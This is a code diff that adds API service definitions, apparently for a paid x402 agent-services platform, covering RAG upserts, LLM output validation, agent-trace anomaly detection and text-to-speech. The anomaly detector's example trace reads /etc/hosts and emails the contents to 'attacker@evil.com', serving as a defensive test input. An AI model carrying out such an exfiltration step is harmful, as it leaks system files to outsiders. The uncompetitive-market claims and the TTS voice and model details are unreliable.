@@ -3256,6 +3256,117 @@ export const SERVICES: ServiceDef[] = [
 		mimeType: "application/json",
 		input: { json: "Pretty-printed or indented JSON string" },
 		example: { json: '{\n  "name": "Alice",\n  "age": 30\n}' }
+	},
+	{
+		id: "rag.batch.upsert",
+		method: "POST",
+		path: "/v1/rag/batch",
+		price: "$0.010",
+		description:
+			"Batch upsert up to 100 text items into the shared Vectorize index in a single call. Each item is embedded via Workers AI (BGE-M3) and upserted with optional metadata. Useful for bulk document ingestion pipelines. One paid call per batch — no per-item pricing. 100% blue ocean on x402.",
+		mimeType: "application/json",
+		input: {
+			namespace:
+				"Caller-chosen namespace to scope vectors (default 'default')",
+			items: "Array of { id, text, metadata? } — max 100 items, text up to 10k chars each"
+		},
+		example: {
+			namespace: "agent-007",
+			items: [
+				{
+					id: "doc-1",
+					text: "Cloudflare Workers AI ships Llama 3.3 70B and BGE-M3 on the edge.",
+					metadata: { source: "blog.cloudflare.com" }
+				},
+				{
+					id: "doc-2",
+					text: "Workers KV is a globally distributed key-value store.",
+					metadata: { source: "developers.cloudflare.com" }
+				}
+			]
+		}
+	},
+	{
+		id: "sec.llm-output-validate",
+		method: "POST",
+		path: "/v1/security/llm-output-validate",
+		price: "$0.030",
+		description:
+			"Validate any LLM output for JSON parse correctness, JSON Schema compliance, type safety, prompt injection (Workers AI + regex), content safety, and PII detection (email, phone, SSN, credit card, API keys). Returns a structured pass/fail verdict with per-check scores and an AI-powered quality summary. KV-cached for 24h. First LLM output validator on x402 — 0 direct competitors.",
+		mimeType: "application/json",
+		input: {
+			output: "LLM output text to validate (1-50000 chars)",
+			schema: "Optional JSON Schema to validate the output against",
+			expectedType:
+				"Expected type: json | string | number | boolean | array | object | any (default any)"
+		},
+		example: {
+			output: '{"name": "Alice", "email": "alice@example.com", "age": 30}',
+			schema: {
+				type: "object",
+				required: ["name", "email"],
+				properties: {
+					name: { type: "string" },
+					email: { type: "string" },
+					age: { type: "number" }
+				}
+			},
+			expectedType: "json"
+		}
+	},
+	{
+		id: "sec.agent-trace-anomaly",
+		method: "POST",
+		path: "/v1/security/agent-trace-anomaly",
+		price: "$0.040",
+		description:
+			"Detect anomalous patterns in agent execution traces: loops (same tool repeated N times), credential scanning (env/secret/API key access), data exfiltration (email/webhook abuse), long-duration steps, rapid-fire abuse, and suspicious input patterns (destructive commands, pipe-to-shell, eval). Runs pattern analysis + Workers AI (Llama 3.1 8B) for verdict and summary. Returns per-step anomaly annotations, overall risk level, and an AI security posture summary. KV-caches by sessionId. Unique on x402 — no direct competitors.",
+		mimeType: "application/json",
+		input: {
+			trace: "Array of { step, action, tool?, input?, output?, timestamp?, duration_ms? } — max 200 steps",
+			sessionId: "Optional session id for KV trace storage (1-256 chars)",
+			store: "Store trace in KV for 24h retrieval (default false)"
+		},
+		example: {
+			trace: [
+				{
+					step: 0,
+					action: "read_file",
+					tool: "filesystem",
+					input: { path: "/etc/hosts" }
+				},
+				{
+					step: 1,
+					action: "send_email",
+					tool: "email",
+					input: {
+						to: "attacker@evil.com",
+						body: "Contents of /etc/hosts"
+					}
+				}
+			],
+			store: false
+		}
+	},
+	{
+		id: "ai.tts",
+		method: "POST",
+		path: "/v1/ai/tts",
+		price: "$0.01",
+		description:
+			"Convert text to natural-sounding speech via ElevenLabs. Returns base64-encoded MP3 with 6 voice options (alloy, echo, fable, onyx, nova, shimmer) and adjustable speed. First TTS endpoint on x402 — 0 direct competitors.",
+		mimeType: "application/json",
+		input: {
+			text: "Text to convert to speech (1-5000 chars)",
+			voice: "Voice id: alloy, echo, fable, onyx, nova, shimmer (default alloy)",
+			model: "ElevenLabs model: tts-1 or tts-1-hd (default tts-1)",
+			speed: "Playback speed 0.25-4.0 (default 1.0)"
+		},
+		example: {
+			text: "Hello from Tanship x402, this is your AI agent speaking.",
+			voice: "alloy",
+			speed: 1.0
+		}
 	}
 ];
 
